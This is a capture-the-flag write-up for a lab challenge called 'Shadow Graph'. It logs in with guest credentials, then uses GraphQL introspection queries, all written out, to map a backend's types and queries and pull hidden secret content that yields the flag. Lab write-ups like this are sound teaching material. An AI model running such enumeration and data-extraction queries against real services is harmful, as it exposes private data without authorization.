# Shadow Graph

<figure><img src="https://miro.medium.com/v2/resize:fit:552/1*t56uH78TltZOTpXew7qy8g.png" alt="" height="475" width="491"><figcaption></figcaption></figure>

Upon opening the web application, we are presented with a login page. We try the credentials `guest:guest` and successfully log in.

Exploring the application, we discover a `/graphql` directory, indicating that the web app utilizes a GraphQL API.

To enumerate all GraphQL types supported by the backend, we can use the following query:

```
{
  __schema {
    types {
      name
    }
  }
}
```

we get a result contains basic default types, such as `Int` or `Boolean,` but also all custom types, such as `Project & Secret`:

<figure><img src="https://miro.medium.com/v2/resize:fit:788/1*EDO3w-6xG_S17x0xMI3h8A.png" alt="" height="210" width="700"><figcaption></figcaption></figure>

Now that we have identified a type, we can proceed to enumerate its fields using the following introspection query:

```
{
  __type(name: "Secret") {
    name
    fields {
      name
    }
  }
}
```

The response reveals the details of the `Secret` user object, including itsh fields.

<figure><img src="https://miro.medium.com/v2/resize:fit:788/1*TJJP23XejX1VkOy7HPwq6A.png" alt="" height="288" width="700"><figcaption></figcaption></figure>

Furthermore, we can enumerate all queries supported by the backend using the following introspection query:

```
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```

<figure><img src="https://miro.medium.com/v2/resize:fit:788/1*ei5Pf9g0ivn7gfqcbDBgtg.png" alt="" height="336" width="700"><figcaption></figcaption></figure>

now that we have all the information we need we can craft our payload to get the flag\
Furthermore, we can enumerate all queries supported by the backend using the following introspection query:

```
{
  project(id: "3") {
    id
    name
    isSecret
    secrets {
      id
      name
      content
    }
  }
}
```

<figure><img src="https://miro.medium.com/v2/resize:fit:788/1*_e-ftGRWDIaifq-nlFa91g.png" alt="" height="244" width="700"><figcaption></figcaption></figure>

Flag: Spark{F4st1ng\_Is\_G00d\_But\_Exp0sIng\_Qu3r13s\_Is\_N0t}
